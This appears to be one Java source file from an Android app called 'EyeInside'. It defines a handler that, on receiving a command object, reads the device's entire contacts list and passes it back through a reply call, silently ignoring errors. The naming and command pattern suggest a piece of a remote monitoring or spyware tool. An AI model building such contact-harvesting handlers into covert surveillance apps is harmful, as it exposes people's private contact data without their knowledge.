package com.code4bones.EyeInside;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract.Contacts;


public class handleContacts extends Handler {
	
	private Context mContext;
	public static final Uri URI = Contacts.CONTENT_URI;
	
	public handleContacts(Context context) {
		mContext = context;
	}
	
	public void handleMessage(Message msg) {
		CommandObj cmd = (CommandObj) msg.obj;
        Cursor cur = mContext.getContentResolver().query(URI, null,null, null, "_id DESC");
        if  (cur == null || !cur.moveToFirst() )
        	return;
        try {
			cmd.Reply(cur);
	        cur.close();
		} catch (Exception e) {
		}
	}
}
